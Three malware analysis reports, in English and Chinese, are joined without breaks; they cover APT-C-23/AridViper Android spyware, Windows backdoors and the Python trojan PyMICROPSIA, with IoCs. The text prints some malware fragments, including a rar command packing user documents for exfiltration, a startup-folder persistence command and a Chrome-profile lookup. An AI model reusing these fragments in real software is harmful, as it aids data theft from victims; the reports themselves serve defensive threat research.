https://www.welivesecurity.com/wp-content/uploads/2020/09/install_malicious_Threema.mp4
After the malware is initialized, in most cases, victims are requested to manually install the legitimate app used as a lure (e.g. Threema), which is stored in the malware’s resources. While the legitimate app is being installed, the malware hides its presence on the affected device. This way, the victims end up with a functioning app they intended to download and spyware silently running in the background. In some cases (e.g. WeMessage, AndroidUpdate) the downloaded apps did not have any real functionality, and only served as bait for installing the spyware.
When first launched, the malware starts to communicate with its Command and Control (C&C) server. It registers the new victim and sends the victim’s device information to the C&C.
Capabilities
Based on the commands received, Android/SpyC23.A can perform the following actions:
Take pictures
Record audio
Restart Wi-Fi
Exfiltrate call logs
Exfiltrate all SMS messages
Exfiltrate all contacts
Download files to device
Delete files from device
Steal files with particular extensions (pdf, doc, docx, ppt, pptx, xls, xlsx, txt, text, jpg, jpeg, png)
Uninstall any app installed on the device
Steal APK installers of apps installed on device
Hide its icon
Get credit balance of SIM on device (it can get a balance by making a call to three different cellular operators: Jawwal, Wataniya, Etisalat)
The following features are new in Android/SpyC23.A compared to the previously documented versions:
Record screen and take screenshots
Record incoming and outgoing calls in WhatsApp
Make a call while creating a black screen overlay activity (to hide call activity)
Read text of notifications from selected messaging and social media apps: WhatsApp, Facebook, Telegram, Instagram, Skype, Messenger, Viber, imo
Dismiss notifications from built-in security apps on some Android devices:
SecurityLogAgent notifications on Samsung devices (package name contains “securitylogagent”)
Samsung notifications (package name contains “samsung.android”)
MIUI Security notifications on Xiaomi devices (package name contains “com.miui.securitycenter”)
Phone Manager on Huawei devices (package name contains “huawei.systemmanager”)
Dismiss its own notifications (an unusual feature, possibly used in case of errors or warnings displayed by the malware)
C&C communication
Besides spying capabilities, the malware’s C&C communication has also undergone an update. In older versions, the C&C in use was hardcoded and either available in plain text or trivially obfuscated, and thus easier to identify. In the updated version, the C&C is well hidden using various techniques and can be remotely changed by the attacker.
In this section, we will describe how Android/SpyC23.A retrieves its C&C server.
The malware uses a native library with three functions. Two of them return opening and closing HTML tags for the title and the third one returns an encrypted string.
Figure 7. Returned strings from the native library
The encrypted string serves two purposes: the first part – before the hyphen (“-”) – is used as part of the password to encrypt files extracted from the affected device. The second part is first decoded (base64) and then decrypted (AES). The decrypted string might, for example, suggest a Facebook profile page for the C&C, but it is still obfuscated.
Figure 8. Decrypted but still obfuscated URL
Some of the substrings in this string are replaced based on a simple substitution table and then the domain part of the apparent URL is replaced.
Figure 9. Decrypted and deobfuscated URL
From this URL, the malware parses the HTML for its title tag.
Figure 10. Parsing website title to retrieve the C&C server
The last step is to replace the first space with a dash and the second one with a dot. With that, obtaining the C&C is done. Such a process allows the malware operators to change their C&C server dynamically.
Figure 11. C&C communication
The malware’s live C&C servers typically pose as websites under maintenance, all using the same logo, shown in Figure 12.
Figure 12. The malware’s C&C server
Conclusion
Our research shows that the APT-C-23 group is still active, enhancing its mobile toolset and running new operations. Android/SpyC23.A – the group’s newest spyware version – features several improvements making it more dangerous to victims.
To prevent falling victim to spyware, we advise Android users to only install apps from the official Google Play Store. In cases where privacy concerns, access issues or other restrictions prevent users from following this advice, users should take extra care when downloading apps from unofficial sources. We recommend scrutinizing the app’s developer, double-checking the permissions requested, and using a trustworthy and up-to-date mobile security solution.
For any inquiries, contact us at threatintel@eset.com.
Indicators of Compromise (IoCs)
ESET detection name
Android/SpyC23.A
Hashes
9e78e0647e56374cf9f429dc3ce412171d0b999e
344f1a9dc7f8abd88d1c94f4323646829d80c555
56f321518401528278e0e79fac8c12a57d9fa545
9e1399fede12ce876cdb7c6fdc2742c75b1add9a
6f251160c9b08f56681ea9256f8ecf3c3bcc66f8
91c12c134d4943654af5d6c23043e9962cff83c2
78dd3c98a2074a8d7b5d74030a170f5a1b0b57d4
1c89cea8953f5f72339b14716cef2bd11c7ecf9a
e79849c9d3dc87ff6820c3f08ab90e6aeb9cc216
C&Cs
https://linda-gaytan[.]website
https://cecilia-gilbert[.]com
https://david-gardiner[.]website
https://javan-demsky[.]website
Distribution URL
https://digital-apps[.]store
MITRE ATT&CK techniques
This table was built using version 7 of the ATT&CK framework .
Initial Access T1444 Masquerade as Legitimate Application Android/SpyC23.A impersonates a legitimate chat application.
T1476 Deliver Malicious App via Other Means SpyC23.A can be downloaded from a malicious alternative app store.
Execution T1575 Native Code SpyC23.A uses a native method to retrieve an encrypted string to obtain its C&C.
Persistence T1402 Broadcast Receivers SpyC23.A listens for the BOOT_COMPLETED broadcast, ensuring that the app's functionality will be activated every time the device starts.
T1420 File and Directory Discovery SpyC23.A retrieves the content of the external storage directory.
T1517 Access Notifications SpyC23.A exfiltrates messages from messaging and social media apps.
T1533 Data from Local System SpyC23.A steals files with particular extensions from external media.
Command and Control T1438 Alternative Network Mediums SpyC23.A can use SMS to receive C&C messages.
T1437 Standard Application Layer Protocol SpyC23.A communicates with C&C using HTTPS and Firebase Cloud Messaging (FCM).
Exfiltration T1532 Data Encrypted Extracted data is transmitted in password-protected ZIP files.
Impact T1447 Delete Device Data SpyC23.A can delete attacker-specified files from the device.概述 双尾蝎（APT-C-23）是一个长期针对中东地区的高级威胁组织，其最早于2017年被披露，至少自2016年5月起，持续针对巴勒斯坦教育机构、军事机构等重要领域开展了有组织，有计划，有针对性的攻击，该组织拥有针对Windows和Android双平台攻击能力。
近日，奇安信威胁情报中心红雨滴团队在日常的威胁狩猎中捕获了该组织多起攻击样本，此次捕获的样本涉及Windows和Android平台，Windows平台样本主要通过伪装成简历文档等诱饵的可执行文件进行初始攻击，此类样本运行后，将会释放展示正常的诱饵以迷惑受害者，同时后门将继续在后台运行以窃取受害者计算机敏感信息。
Android平台样本继续保持了双尾蝎组织一贯的风格，通过伪装为聊天软件诱导受害者下载安装使用，为了使样本更具真实性，攻击者还特意制作了官网进行恶意APP分发，同时，据国外安全厂商报道，双尾蝎组织还制作了安卓应用市场以分发其恶意软件。
奇安信威胁情报中心在发现此次攻击活动的第一时间便向安全社区进行了预警。
样本分析 Windows平台样本分析 此次捕获的Windows平台样本采用伪装成简历文档的可执行文件进行攻击，相关信息如下：
cv AYA ALI 888_8630973_43897309634.exe
c12b3336f5efc8e83fcace6f81b27642
2020:10:11 07:45:13+00:00
ruthgreenrtg.live
样本运行后，将从资源获取诱饵文档释放展示，诱饵文档伪装成 IT 工程师求职简历，并附上了中东美女照片，极具诱惑性。
样本使用Delphi7编写，并且带有一个隐藏的窗体：
窗体中包含三个按钮以及四个定时器组件，该样本把所有恶意行为放在按钮和定时器的响应代码中。
样本执行后，只有 Timer1 和 Timer4 定时器处于活跃状态，其余定时器都被禁止执行，其中 Timer1 会引导其他控件执行任务， Time1 执行后首先会从资源中获取诱饵文档数据保存到到： %tmp%\cv AYA ALI 888.doc ，再调用 word 打开 cv AYA ALI888.docx 。
资源中保存的诱饵文档数据如下：
通过 word 打开释放的诱饵文档，迷惑受害者。
之后尝试获取计算机名字，用户名，系统版本信息。
判断系统版本并生成文件 GUID. bin标识被感染的计算机。
根据不同的操作系统，将GUID .bin 保存相应的文件目录，系统对应目录如下所示。
对应保存目录
Windows XP
C:\Documents and Settings\%Username%\Application Data
其他 Windows 版本
%ProgramData%
Timer4 定时器会在启动目录释放一个指向自身的 lnk 文件用于持久化。
样本会尝试将 lnk 路径写入注册表自启动项，如果当前系统是 Windows XP 或者样本以管理员权限运行，该操作将会成功。
将获取到的系统版本，计算机名，用户名， MAC 地址，安全软件名信息经过 base64 编码之后通过 HTTP 协议发送给服务端上线。上线接口： http[:]//ruthgreenrtg.live/xqgjdxa/yhhzireha/hknbuahwg 。
Base64 编码后的计算机信息如下：
在分析过程中，通信数据如下图所示：
样本会通过轮询的方式不断的从服务器 ( http[:]//ruthgreenrtg.live/xqgjdxa/yhhzireha/zbkvngmnc ) 获取指令执行。
该样本具有截屏、下载执行，文件上传、远程 shell 功能，相关指令功能如下：
Token
AAAnnnnccccwwwAAA_1
远程 shell
AAAnnnnccccwwwAAA_2
AAAnnnnccccwwwAAA_3
远程shell:通过 管道 的方式执行shell命令。
命令执行结束后，将会把执行结果回传到 http[:]//ruthgreenrtg.live/xqgjdxa/yhhzireha/tigkjqay 。
屏幕截图功能：远程服务 下发 该功能指令数据包如图所示：
收到命令后，该样本将在在 %TMP% 目录生成 jpeg 格式截图文件。
生成的截图文件如下。
之后将生成的截图上传到 http[:]//ruthgreenrtg.live/xqgjdxa/yhhzireha/ibcdgpuw 。
下载执行 : 样本从命令请求的返回包中获取文件 URL 链接，然后将文件下载到本地 %TMP% 目录，下载的文件是经过 base64 编码后的 txt 文本文件，之后样本会将文件 base64 解码保存为 EXE 文件并执行。
执行解码保存的可 执行 文件。
遗憾的是，在实际分析 过程 中，我们并没有获取到相关下载文件。
Android平台样本分析 双尾蝎组织在此次Android平台的攻击活动中使用的手法与其惯用手法一致，制作了一个MygramIM应用以及另外一个交友聊天软件应用介绍网站，提供相关应用简介以及应用下载，伪造的网站界面如下：
此类界面分发的APP是双尾蝎组织常用的Android木马，相关信息如下：
MyGramIM.signed.apk
63a0c10dfd3e89683a476fa7e319e017
com.ions.app
WhispersTalk.apk
c76402446b83840dd2d3635522874f8c
Com.whispers.chat
当应用安装启动后将显示相关应用界面，而恶意功能则开始在后台执行。运行界面如图所示：
此类恶意应用功能与红雨滴团队2019年发布的《双尾蝎（APT-C-23）团伙利用带有政治主题的Android恶意软件针对巴勒斯坦的攻击分析》一文中的Android恶意软件功能基本一致，包括获取受害者手机短信，联系人，文件，录音等功能。并且，也都是通过通过Google的FCM（FirebaseCloud Messaging）服务和短信下发指令执行恶意功能。此次短信指令采取了两次base64编码处理。
短信控制指令以及对应功能如下表所示：
开启上传录音
52101
启动应用程序
52102
关闭应用程序
52103
Enable Mobile Data
52104
Disable Mobile Data
52105
卸载应用程序
52106
删除录音文件
52107
开启WiFi
52108
重启录音功能
52109
52110
获取用户手机已安装程序信息
52111
禁用第一次更新
52112
启用第一次更新
52113
获取所有短信内容
52114
获取手机通讯录
52115
启用更新通知
52116
禁用更新通知
52117
启用新的URL
52118
上传手机文件
52119
获取控制指令
52120
获取录制的内容
52121
未启用功能
52122
获取短信通信记录
通过Google的FCM（Firebase Cloud Messaging）服务下发控制指令以及对应功能如下表所示：
Eduardo
JadisWalsh
申请权限 统计短信、通讯录
EzekielMonroe
检测录音文件是否存在
LizzieHenry
开始录音并上传录音
CarlRhee/RositaPorter
开启WiFi
BethAaron
对用户手机呼叫转移
HershelJones
无实际功能
AndreaGrimes
获取用户手机短信、获取用户通讯录
Stookey
上传手机文件
SimonBlake
停止录音并上传文件
OliviaKal/FrancineGary
TanyaSubramanian
仿冒Facebook等应用更新
update
仿冒Facebook等应用更新
Michonne
TobinSpencer
监控电量变化
LoriHarrison
上传手机固件信息
MaggieChambler
获取连接状态
SashaGreene
发送申请状态
Barbara
电话呼叫转移
JessieMonroe
电话呼叫转移
LydiaAnderson
手机回到主界面、可隐藏APP图标、设置隐藏时间等
DeannaAnderson
PatriciaKent
上传手机各种文件
DianneJared
AmyLuke
android/main/recordHis目录下文件上传
SophiaAxel
CyndieSamuels
LauraPeletier
设置响铃模式
溯源关联 奇安信红雨滴团队安全研究人员结合奇安信威胁情报中心ALPHA平台等内部数据，对此次攻击活动中使用的恶意代码以及攻击手段关联分析发现，此次攻击活动疑似出自APT组织双尾蝎之手。
从代码上，此次攻击活动Android端恶意应用与双尾蝎组织历史使用恶意代码基本一致，均采用了FCM与短信两种指令通信方式，且控制指令也完全一致。
同时奇安信威胁情报中心ALPHA平台(ti.qianxin.com)对此次攻击活动相关IOC已有APT-C-23标签。
总结 中东地区沟通了欧亚非，地理位置十分重要，而由于石油资源、宗教信仰、地缘政治、历史原因等问题又常年战乱不断。随着手机的普及与移动互联网的发展，移动平台已经成为了APT攻击的新战场。APT-C-23常年对巴勒斯坦多个重要领域进行攻击，并持续更新其攻击武器，红雨滴团队将时刻关注APT-C-23 Windows 与 Android最新变种的出现。
同时基于奇安信威胁情报中心的威胁情报数据的全线产品，包括奇安信威胁情报平台（TIP）、天擎、天眼高级威胁检测系统、奇安信NGSOC等，都已经支持对此类攻击的精确检测。
IOCs 471313cb47c6165ec74088fafb9a5545
533b1aea016aacf4afacfe9a8510b168
c12b3336f5efc8e83fcace6f81b27642
006b96fd401a462f084664bbb58344f9
63a0c10dfd3e89683a476fa7e319e017
c76402446b83840dd2d3635522874f8c
http[:]//ruthgreenrtg.live/xqgjdxa/yhhzireha/hknbuahwg
http[:]//ruthgreenrtg.live/xqgjdxa/yhhzireha/zbkvngmnc
http[:]//ruthgreenrtg.live/xqgjdxa/yhhzireha/tigkjqay
http[:]//ruthgreenrtg.live/xqgjdxa/yhhzireha/ibcdgpuw
http[:]//ruthgreenrtg.live/xqgjdxa/yhhzireha/tcpuvvfi
http[:]//escanor.live/rip/ace/king
http[:]//escanor.live/rip/ace/ban
http[:]//escanor.live/rip/ace/fox
https[:]//whispers-talk[.]site/app/whispers/download
https[:]//amanda-hart[.]website
https[:]//darrell-ferris.site/download/YLFIHmx
https[:]//brian-garcia.work
参考链接 https://ti.qianxin.com/blog/articles/apt-c-23-analysis-of-attacks-on-palestinians-by-gangs-using-android-malware-with-political-themes/双尾蝎APT团伙是一个长期针对中东地区的高级威胁组织，其最早于2017年被披露。其至少自2016年5月起，便持续针对巴勒斯坦教育机构、军事机构等重要领域开展了有组织，有计划，有针对性的攻击，该组织拥有针对Windows和Android双平台攻击能力。
近日，奇安信威胁情报中心红雨滴团队在日常的威胁狩猎中捕获多个伪装成视频、文档和图片的可执行文件，此类样本将图标设置为对应的诱饵类型，诱导受害者点击执行。当样本执行后，将释放展示相关诱饵迷惑受害者。释放展示的诱饵包括CIA对哈马斯支持的相关政治类诱饵、巴勒斯坦地区美女视频图片、简历相关文档等。奇安信威胁情报中心经过溯源关联后发现，此次捕获样本疑似均来自APT组织：双尾蝎。
奇安信威胁情报中心在发现此次攻击活动的第一时间便向安全社区进行了预警。
Financing USA is illegal and suspicious organizations.exe
9fcb1cb7e8bb3424ce7e83ce5ad9a78d
释放展示的文档内容包括CIA资助哈马斯相关信息，简历信息，诱饵内容如下：
9fcb1cb7e8bb3424ce7e83ce5ad9a78d ae0b53e6b378bf74e1dd2973d604be55
sun is crying in a door and what it tells tells my country Take me on my homelandd.exe
1507f7ecc5fe8ef4c90c853d64e1a9f9
bihbik lamaa bitahki tarsum eishafafik dahka hbihbik lamaa bitahki.exe
26a1fc2f983fb8abae4b47b0c7edfee6
Her hands are following my pain Irfana, I am suffering What lightness and my pain wasted me.exe
e0f8e726e4d5a4ad22de8a62c98e1737
影音类诱饵主要以中东地区美女视频，照片为主，部分诱饵内容如下：
1507f7ecc5fe8ef4c90c853d64e1a9f9 9af8f2a02befa7ceb9b72359ce30c0bb
样本伪装成word文档，执行后将从资源中获取数据释放到Financing USA is illegal and suspicious organizations.docx，并打开该文档迷惑受害者。
若成功通信则进入后续命令分发函数，获取Secombe.txt数据与C2: ansonwhitmore.live/yohann/bordalas/alejandro获取命令执行。
定时器Timer3功能为拷贝自身，当计算机中未安装卡巴时候，拷贝自身到%PROGRAMDATA%\\SecProcessingWindowsSystem.exe
之后将尝试建立持久化，将设置自身lnk带上-rq参数避免每次开机都打开诱饵文档让用户产生怀疑。同时对不同环境将执行不同的持久化操作：
定时器Timer1主要功能为释放诱饵文档以及与C2通信
当Time1执行后将检测当前的启动参数，若不带-rq则将MYDATA资源中的诱饵文档释放到%temp%\\Manal Cv.docx。
奇安信威胁情报中心红雨滴团队对利用奇安信威胁情报中心ALPHA https://ti.qianxin.com/ 平台对此次攻击活动恶意代码，攻击手法等方面分析发现，此次捕获的样本疑似来自APT组织双尾蝎。
经关联分析，我们从样本库中发现样本7ef3520da2151c3724e3615943833a5f与此次捕获VC版本后门样本代码几乎一致。
双尾蝎组织是常年活跃在中东地区APT团伙，其具有Windows和Android双平台攻击武器，且仅Windows平台恶意代码就丰富多变，具有多种语言编译的后门，奇安信威胁情报中心将持续追踪该组织。
同时基于奇安信威胁情报中心的威胁情报数据的全线产品，包括奇安信威胁情报平台（TIP）、天擎、天眼高级威胁检测系统、奇安信NGSOC等，都已经支持对此类攻击的精确检测。
89e9823013f711d384824d8461cc425d
21aa63b42825fb95bf5114419fb42157
9fcb1cb7e8bb3424ce7e83ce5ad9a78d
4694bf0093c95fa9a7f49af3a7722211
1507f7ecc5fe8ef4c90c853d64e1a9f9
26a1fc2f983fb8abae4b47b0c7edfee6
9af8f2a02befa7ceb9b72359ce30c0bb
e0f8e726e4d5a4ad22de8a62c98e1737
ae0b53e6b378bf74e1dd2973d604be55
c27f925a7c424c0f5125a681a9c44607
835f86e1e83a3da25c715e89db5355cc
f5bac4d2de2eb1f8007f68c77bfa460e
faff57734fe08af63e90c0492b4a9a56
c4a90110acd78e2de31ad9077aa4eff6
9d76d59de0ee91add92c938e3335f27f
a0e681a0637988baea55b50cfff5c3ad
51ae5a914f10945edcc4668550c5d880
malpas-west-rook[.]live
charmainellauzier[.]host
judystevenson[.]info
jaime-martinez[.]info
krasil-anthony[.]icu
ansonwhitmore[.]live
gonzalez-anthony[.]info
gallant-william[.]icu
doloresabernathy[.]icu
[1]. https://twitter.com/RedDrip7/status/1331458999628091395日本語 ( Japanese )
Executive Summary
Unit 42 researchers have been tracking the threat group AridViper, which has been targeting the Middle Eastern region. As part of this research, a new information-stealing Trojan with relations to the MICROPSIA malware family has been identified, showing that the actor maintains a very active development profile, creating new implants that seek to bypass the defenses of their targets. We have named this new malware family PyMICROPSIA because it is built with Python.
Figure 1 below provides a high-level overview of the capabilities of the PyMICROPSIA malware family and similarities observed with previous AridViper activity. While investigating PyMICROPSIA capabilities, we identified two additional samples hosted in the attacker’s infrastructure, which are downloaded and used by PyMICROPSIA during its deployment. The additional samples provide persistence and keylogging capabilities, which we discuss later.
Figure 1. PyMICROPSIA overview.
In this blog, we will detail the functionality and objectives of PyMICROPSIA and analyze its command and control (C2) implementation. We will also highlight the main observations that allow us to attribute PyMICROPSIA to previous AridViper activity.
Palo Alto Networks Next-Generation Firewall customers are protected from the attacks outlined in this blog with WildFire , URL Filtering and DNS Security subscriptions. Customers are also protected with AutoFocus and Cortex XDR .
PyMICROPSIA Analysis
PyMICROPSIA has a rich set of information-stealing and control capabilities, including:
File uploading.
Payload downloading and execution.
Browser credential stealing. Clearing browsing history and profiles.
Taking screenshots.
Keylogging.
Compressing RAR files for stolen information.
Collecting process information and killing processes.
Collecting file listing information.
Deleting files.
Rebooting machine.
Collecting Outlook .ost file. Killing and disabling Outlook process.
Deleting, creating, compressing and exfiltrating files and folders.
Collecting information from USB drives, including file exfiltration.
Audio recording.
Executing commands.
Implementation Overview
PyMICROPSIA is an information-stealing Trojan built with Python and made into a Windows executable using PyInstaller .
Figure 2. PyInstaller strings in PyMICROPSIA.
It implements its main functionality by running a loop, where it initializes different threads and calls several tasks periodically with the intent of collecting information and interacting with the C2 operator.
Figure 3. Main code loop.
The actor makes use of several interesting Python libraries to achieve its purposes, including both built-in Python libraries and specific packages. Some examples of information-stealing specific libraries are:
PyAudio , for audio stealing capabilities.
mss , for screenshot capabilities.
Figure 4. PyAudio library for audio recording.
Figure 5. mss library for screenshots.
The usage of Python built-in libraries is expected for multiple purposes, such as interacting with Windows processes , Windows registry , networking, file system and so on.
Figure 6. Windows Registry interaction.
Figure 7. Windows processes interaction.
For more specific interactions with the Windows operating system, it makes use of libraries such as:
WMI , for interaction with Windows Management Instrumentation.
win32security and ntsecuritycon , for interaction with the win32security API.
Figure 8. WMI usage for USB interaction.
Figure 9. win32security and ntsecuritycon usage.
An in-depth analysis of the code and capabilities of PyMICROPSIA can be found in the Appendix.
Command and Control
PyMICROPSIA implements a simple HTTP POST-based C2 protocol, using different Uniform Resource Identifier (URI) paths and variables during the communication depending on the functionality invoked (full details on the implementation can be found in the Appendix).
The following table summarizes the URI paths and corresponding functionality in PyMICROPSIA:
Method
Table 1. Main purpose of configuration folders and files.
It's also important to note that in the PyMICROPSIA samples analyzed, the C2-related code shows several code branches that will never be executed when responses are processed, likely because the actor is still actively working on the code. Based on the code sections that are reachable, the following table summarizes the commands and actions performed on the victim machine:
Command
Action
Is AridViper Working on New Attack Vectors?
PyMICROPSIA is designed to target Windows operating systems only, but the code contains interesting snippets checking for other operating systems, such as “posix” or “darwin”. This is an interesting finding, as we have not witnessed AridViper targeting these operating systems before and this could represent a new area the actor is starting to explore.
Python
else:
if os.name == 'posix' and sys.platform == 'darwin':
PathName = os.getenv('HOME') + '/Library/Application Support/Google/Chrome/Default/'
if os.path.isdir(PathName) == False:
sys.exit(0)
elif os.name == 'posix':
PathName = os.getenv('HOME') + '/.config/google-chrome/Default/'
if os.path.isdir(PathName) == False:
sys.exit(0)
return PathName
1 2 3 4 5 6 7 8 9 10
else : if os . name == 'posix' and sys . platform == 'darwin' : PathName = os . getenv ( 'HOME' ) + '/Library/Application Support/Google/Chrome/Default/' if os.path . isdir ( PathName ) == False : sys . exit ( 0 ) elif os . name == 'posix' : PathName = os . getenv ( 'HOME' ) + '/.config/google-chrome/Default/' if os.path . isdir ( PathName ) == False : sys . exit ( 0 ) return PathName
For now, the code found is very simple, and could be part of a copy and paste effort when building the Python code, but in any case, we plan to keep it on our radar while researching new activity.
Additional Payloads
During the C2 interactions, PyMICROPSIA downloads two additional samples that are dropped and executed on the victim’s system, running additional functionality. These payloads are not Python / PyInstaller based.
KeyLogger functionality
This is a very interesting case, as the keylogging functionality hasn’t been implemented natively as part of PyMICROPSIA. Instead, the sample downloads a specific payload (see the section on File Download Capabilities in the Appendix for details on how the payload is downloaded).
The payload is downloaded with filename “MetroIntelGenericUIFram.exe” and has the following SHA-256:
381b1efca980dd744cb8d36ad44783a35d01a321593a4f39a0cdae9c7eeac52f
The sample implements keylogging capabilities using the GetAsyncKeyState API method:
Figure 10. Keylogger GetAsyncKey() code.
It has a hardcoded configuration directly related to the directory structure initialized by the main PyMICROPSIA sample, so it needs to be compiled according to it. It needs to run under a specific directory created by PyMICROPSIA (“ModelsControllerLibb”), and will store keystroke information under the “HPFusionManagerDell” folder.
Figure 11. Hardcoded configuration parameters.
The keylogger drops information into the HPFusionManagerDell directory with the following filename structure and format:
Figure 12. Keylogger output file format.
Figure 13. Keylogger file content structure.
Persistence
Persistence in this malware sample can be achieved via regular methods, such as setting up registry keys, which is done as part of the Python code as follows:
Figure 14. Registry key persistence.
However, there is something interesting about persistence in this implementation. The sample downloads another payload from the C2 server (see the File Download Capabilities section for more details). This payload is named “SynLocSynMomentum.exe”, with the following SHA-256:
9c32fdf5af8b86049abd92561b3d281cb9aebf57d2dfef8cc2da59df82dca753
The sample is executed with specific parameters:
SynLocSynMomentum.exe ModelsControllerLibb ModelsControllerLib
It sets up persistence via the shortcut .lnk copied to the startup menu. It's striking that this code is run as a separate payload considering the amount of functionality already present in the Python code.
MS DOS
"C:\Windows\System32\cmd.exe" /c move "C:\Users\admin\AppData\Local\Temp\\ModelsControllerLib.lnk" "C:\Users\admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ModelsControllerLib.lnk"
"C:\Windows\System32\cmd.exe" / c move "C:\Users\admin\AppData\Local\Temp\\ModelsControllerLib.lnk" "C:\Users\admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ModelsControllerLib.lnk"
Relations With Other MICROPSIA Activity
We unearthed PyMICROPSIA while investigating recent MICROPSIA activity related to the Middle Eastern region, and there are multiple aspects of the malware that link the activity to AridViper, including the following examples.
Code Overlaps
One of the first things that caught our attention regarding this sample was the C2 implementation and capabilities, which are quite similar to known MICROPSIA samples. For example, see the C2 descriptions in previous research by Radware and Check Point .
Also, one of the tactics, techniques and procedures (TTPs) observed across MICROPSIA samples is the use of rar.exe to compress data for exfiltration. In this version, rar.exe is downloaded from the C2 infrastructure and used with very similar parameters as observed in previous samples:
Python
k24 = '"' + Wv + '\\*.dot' + '" '
k25 = '"' + Wv + '\\*.dotx' + '" '
AllFile = k1 + k2 + k3 + k4 + k5 + k6 + k7 + k8 + k9 + k11 + k12 + k13 + k14 + k15 + k16 + k17 + k18 + k19 + k20 + k21 + k22 + k23 + k24 + k25
AllFiles_Drvi = AllFile
flTDType = AllFiles_Drvi
te = file_D
En_crpypt2 = 'a -r -ep1 -v2.5m -ta' + te + ' -hp'
En = '4545933464930447517744759'
mm = chick_Device_Name() + En
nnWithoutdel = En_crpypt2 + mm
subprocess.call('"' + Rar_File + '"' + ' ' + (nnWithoutdel + ' ' + '"' + Zip_File2 + '_NETWORKWTHDate"' + ' ' + flTDType), shell=True)
1 2 3 4 5 6 7 8 9 10 11
k24 = '"' + Wv + '\\*.dot' + '" ' k25 = '"' + Wv + '\\*.dotx' + '" ' AllFile = k1 + k2 + k3 + k4 + k5 + k6 + k7 + k8 + k9 + k11 + k12 + k13 + k14 + k15 + k16 + k17 + k18 + k19 + k20 + k21 + k22 + k23 + k24 + k25 AllFiles_Drvi = AllFile flTDType = AllFiles_Drvi te = file_D En_crpypt2 = 'a -r -ep1 -v2.5m -ta' + te + ' -hp' En = '4545933464930447517744759' mm = chick_Device_Name ( ) + En nnWithoutdel = En_crpypt2 + mm subprocess . call ( '"' + Rar_File + '"' + ' ' + ( nnWithoutdel + ' ' + '"' + Zip_File2 + '_NETWORKWTHDate"' + ' ' + flTDType ) , shell = True )
For example, see how one recent sample of MICROPSIA makes use of rar.exe.
SHA-256: 3c8979740d2f634ff2c0c0ab7adb78fe69d6d42307118d0bb934f03974deddac
MS DOS
"C:\Program Files\WinRAR\Rar.exe" a -r -ep1 -v2500k -hpcec6b597e046386f74b807c60ada61a5_d01247a1eaf1c24ffbc851e883e67f9b -ta2020-10-21 "C:\ProgramData\commonlogfiles\LMth_C" "C:\Users\admin\*.xls" "C:\Users\admin\*.xlsx" "C:\Users\admin\*.doc" "C:\Users\admin\*.docx" "C:\Users\admin\*.csv" "C:\Users\admin\*.pdf" "C:\Users\admin\*.ppt" "C:\Users\admin\*.pptx" "C:\Users\admin\*.odt" "C:\Users\admin\*.mdb" "C:\Users\admin\*.accdb" "C:\Users\admin\*.accde" "C:\Users\admin\*.txt" "C:\Users\admin\*.rtf"
"C:\Program Files\WinRAR\Rar.exe" a -r -ep1 -v2500k -hpcec6b597e046386f74b807c60ada61a5 _ d01247a1eaf1c24ffbc851e883e67f9b -ta2020 - 10 - 21 "C:\ProgramData\commonlogfiles\LMth_C" "C:\Users\admin\*.xls" "C:\Users\admin\*.xlsx" "C:\Users\admin\*.doc" "C:\Users\admin\*.docx" "C:\Users\admin\*.csv" "C:\Users\admin\*.pdf" "C:\Users\admin\*.ppt" "C:\Users\admin\*.pptx" "C:\Users\admin\*.odt" "C:\Users\admin\*.mdb" "C:\Users\admin\*.accdb" "C:\Users\admin\*.accde" "C:\Users\admin\*.txt" "C:\Users\admin\*.rtf"
C2 Communication Similarity
The URI path structures observed in multiple MICROPSIA samples follow a similar structure to the ones in the PyMICROPSIA samples. For example, if we look into the same recent MICROPSIA sample, we can observe the random characters and structure of the URI paths.
SHA-256:
3c8979740d2f634ff2c0c0ab7adb78fe69d6d42307118d0bb934f03974deddac
hxxps://jaime-martinez[.]info/sujqbrgpb/bztjpskd/rxkwjt
hxxps://jaime-martinez[.]info/sujqbrgpb/bztjpskd/zxfsyadoss/gM69sY
hxxp://jaime-martinez[.]info/sujqbrgpb/bztjpskd/tpmpyyzwg
hxxps://jaime-martinez[.]info/sujqbrgpb/bztjpskd/ouwmhf/ImoOEJ
hxxp://jaime-martinez[.]info/sujqbrgpb/bztjpskd/ouwmhf/voT8FY
hxxp://jaime-martinez[.]info/sujqbrgpb/bztjpskd/rxkwjt
hxxp://jaime-martinez[.]info/sujqbrgpb/bztjpskd/zxfsyadoss/TocLI5
hxxps://jaime-martinez[.]info/sujqbrgpb/bztjpskd/ouwmhf/9WnKfe
hxxp://jaime-martinez[.]info/sujqbrgpb/bztjpskd/zxfsyadoss/pyPaqj
hxxps://jaime-martinez[.]info/sujqbrgpb/bztjpskd/ouwmhf/HRabCX
Themes Used
In the past, we have seen references in MICROPSIA to specific themes when it comes to code and C2 implementation, such as The Big Bang Theory or Game of Thrones , and this new implementation is not different, including multiple references to multiple famous actor names, both in code variables as well as in infrastructure used, as can be seen in Figures 15 and 16.
Figure 15. MICROPSIA is known for referencing themes in code, such as The Big Bang Theory and Game of Thrones. The reference to the actor Fran Drescher shown above seems in line with previous observations of themes.
Figure 16. MICROPSIA is known for referencing themes in code, such as The Big Bang Theory and Game of Thrones. The reference to the actor Keanu Reeves shown above seems in line with previous observations of themes.
Also, as described in the Command and Control section, the C2 operations contain a lot of Disney references.
Another interesting detail is the presence of Arabic comments in the code:
Python
Delete_Request_Error('لم يتم ضغط هذا الملف!!..')
This could be a false flag, but it is another possible link to the regional attribution of this malware sample.
Conclusion
AridViper is an active threat group that continues developing new tools as part of their arsenal. PyMICROPSIA shows multiple overlaps with other existing AridViper tools such as MICROPSIA. Also, based on different aspects of PyMICROPSIA that we analyzed, several sections of the malware are still not used, indicating that it is likely a malware family under active development by this actor.
Palo Alto Networks customers are protected from the attacks outlined in this blog in the following ways:
All known AridViper tools, including MICROPSIA and PyMICROPSIA, have malicious verdicts in WildFire.
AutoFocus customers can track the AridViper actor and its tools.
Cortex XDR blocks both PyMICROPSIA and the dropped payloads.
C2 domains have been categorized as Command and Control in URL Filtering and DNS Security.
Indicators of Compromise
PyMICROPSIA Samples
11487246a864ee0edf2c05c5f1489558632fb05536d6a599558853640df8cd78
ddaeffb12a944a5f4d47b28affe97c1bc3a613dab32e5b5b426ef249cfc29273
46dae9b27f100703acf5b9fda2d1b063cca2af0d4abeeccc6cd45d12be919531
MICROPSIA Samples
47d53f4ab24632bf4ca34e9a10e11b4b6c48a242cbcfcb1579d67523463e59d2
